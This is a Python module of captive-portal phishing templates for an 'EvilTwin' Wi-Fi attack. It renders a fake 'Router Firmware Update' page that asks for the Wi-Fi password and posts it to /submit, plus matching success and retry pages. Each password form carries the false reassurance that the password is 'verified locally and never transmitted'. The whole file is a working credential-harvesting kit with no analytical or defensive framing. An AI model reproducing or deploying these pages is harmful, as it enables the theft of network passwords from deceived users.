"""Captive-portal phishing page templates for the EvilTwin open-twin attack."""
from __future__ import annotations


def render_portal(ssid: str) -> str:
    return _PAGE.replace("{{SSID}}", ssid)


def render_success(password: str, ssid: str) -> str:
    return _SUCCESS_PAGE.replace("{{SSID}}", ssid).replace("{{PASSWORD}}", password)


def render_error(message: str, ssid: str) -> str:
    return _ERROR_PAGE.replace("{{SSID}}", ssid).replace("{{MESSAGE}}", message)


_PAGE = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Router Firmware Update</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);min-height:100vh;
  display:flex;align-items:center;justify-content:center;color:#e2e8f0}
.card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:40px;
  max-width:420px;width:90%;box-shadow:0 25px 50px rgba(0,0,0,.5)}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#60a5fa}
h1{font-size:22px;text-align:center;margin-bottom:8px;color:#f8fafc}
.sub{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:28px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:#94a3b8;margin-bottom:6px}
.field input{width:100%;padding:12px 16px;border:1px solid #334155;border-radius:8px;
  background:#0f172a;color:#e2e8f0;font-size:15px;outline:none;transition:border .2s}
.field input:focus{border-color:#60a5fa}
.btn{width:100%;padding:14px;border:none;border-radius:8px;background:#60a5fa;
  color:#0f172a;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#93bbfd}
.warn{text-align:center;color:#f59e0b;font-size:12px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.94-.49-7-3.85-7-7.93 0-.62.08-1.22.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
  </div>
  <h1>Firmware Update Required</h1>
  <p class="sub">{{SSID}} &mdash; a security update is needed to continue.</p>
  <form method="POST" action="/submit">
    <div class="field">
      <label for="pw">Wi-Fi Password</label>
      <input type="password" id="pw" name="password" placeholder="Enter network password" required autofocus>
    </div>
    <button type="submit" class="btn">Update &amp; Connect</button>
  </form>
  <p class="warn">Your password is verified locally and never transmitted.</p>
</div>
</body>
</html>
"""


_SUCCESS_PAGE = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);min-height:100vh;
  display:flex;align-items:center;justify-content:center;color:#e2e8f0}
.card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:40px;
  max-width:420px;width:90%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,.5)}
.check{font-size:64px;margin-bottom:16px}
h1{font-size:22px;color:#34d399;margin-bottom:8px}
.sub{color:#94a3b8;font-size:14px}
</style>
</head>
<body>
<div class="card">
  <div class="check">&#10003;</div>
  <h1>Firmware Updated</h1>
  <p class="sub">Connected to <strong>{{SSID}}</strong>. You may close this page.</p>
</div>
</body>
</html>
"""


_ERROR_PAGE = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Update Failed</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);min-height:100vh;
  display:flex;align-items:center;justify-content:center;color:#e2e8f0}
.card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:40px;
  max-width:420px;width:90%;box-shadow:0 25px 50px rgba(0,0,0,.5)}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#f87171}
h1{font-size:22px;text-align:center;margin-bottom:8px;color:#f87171}
.sub{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:#94a3b8;margin-bottom:6px}
.field input{width:100%;padding:12px 16px;border:1px solid #334155;border-radius:8px;
  background:#0f172a;color:#e2e8f0;font-size:15px;outline:none;transition:border .2s}
.field input:focus{border-color:#60a5fa}
.btn{width:100%;padding:14px;border:none;border-radius:8px;background:#60a5fa;
  color:#0f172a;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#93bbfd}
.warn{text-align:center;color:#f59e0b;font-size:12px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
  </div>
  <h1>Update Failed</h1>
  <p class="sub">{{MESSAGE}}</p>
  <form method="POST" action="/submit">
    <div class="field">
      <label for="pw">Wi-Fi Password</label>
      <input type="password" id="pw" name="password" placeholder="Try again" required autofocus>
    </div>
    <button type="submit" class="btn">Retry</button>
  </form>
  <p class="warn">Your password is verified locally and never transmitted.</p>
</div>
</body>
</html>
"""
